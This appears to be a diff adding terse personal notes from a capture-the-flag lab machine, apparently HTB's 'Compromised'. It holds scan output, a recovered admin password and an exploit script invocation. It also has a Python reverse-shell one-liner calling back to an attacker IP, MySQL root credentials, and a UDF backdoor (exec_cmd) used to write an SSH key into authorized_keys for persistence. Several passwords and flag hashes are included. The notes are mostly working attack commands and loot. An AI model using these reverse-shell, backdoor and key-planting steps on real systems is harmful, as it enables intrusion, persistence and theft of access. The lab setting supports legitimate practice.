@@ -1,0 +1,37 @@
+22,80 
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Legitimate Rubber Ducks | Online Store
+admin@compromised.htb
+http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt
+User: admin Passwd: theNextGenSt0r3!~
+
+python exploitdb.py -u admin -p="theNextGenSt0r3!~" -t http://10.10.10.207/shop/admin
+
+https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.39",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+
+cp /tmp/id_rsa /var/www/.ssh/id_rsa
+
+https://pure.security/simple-mysql-backdoor-using-user-defined-functions/#:~:text=So%20what%20is%20a%20UDF,the%20server%20from%20inside%20MySQL.
+
+mysql -u root -pchangethis -e "SHOW DATABASES;"
+
+https://www.ssh.com/ssh/keygen/
+
+ssh-keygen -t rsa -f /tmp/id_rsa
+
+
+select exec_cmd('mkdir /var/lib/mysql/.ssh')
+
+grep -nrli sysadmin
+
+3*NLJE32I$Fe
+zlke~U3Env82m2-
+
+select exec_cmd('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAucvyL3t23CewT6ySqCieJmKZ2lfTvqdLTt/hk2ucePtmnnp1Vn6LLS0MJ+YuUDk7aVWCol2ObsCclgUrpjDpUVYikkKu2QzrUUiQ6VM7ctO9cV2Le3wGX5yXufSTdVm9fQ2FklGDpYYpiZVShZ/1vRTBvmboFdOyQIYfRpfBkODDXB+Wwjqi25OPkYU/9hFGw0xeBhHmRX2YzBoI3Xf6EpWChqzKTgW5WhGoSECQw7Faz/hQex3BhQKsgK2Y80xwjf92UzPhP7tbG1wmt1jNe+8fftZjrvHXlUu5Fx4IbG2a9SwZZbi55uZdxs4cMX0dxaDwAOliIjO6Swv8g7ficExUORQUuvWVukT8Oxtx4UMot3x/GqhatghRyOH/w6NTSLRLdTxFvefjpb+TGSvIqFGrRcIX9cc1WCmGNPXtA1E+OBdro2rrjz9bJLHKiggsH409a80CsWVJ5ONk/9uIwkinedUaCOvR/LMdejZtNgU9zg5ESdOAlLc5tQRmRU8= user@parrot> /var/lib/mysql/.ssh/authorized_keys')
+
+3174b40ce3ee702029df82ceb0e33296
+0452b223154db3da89877beedb47744e
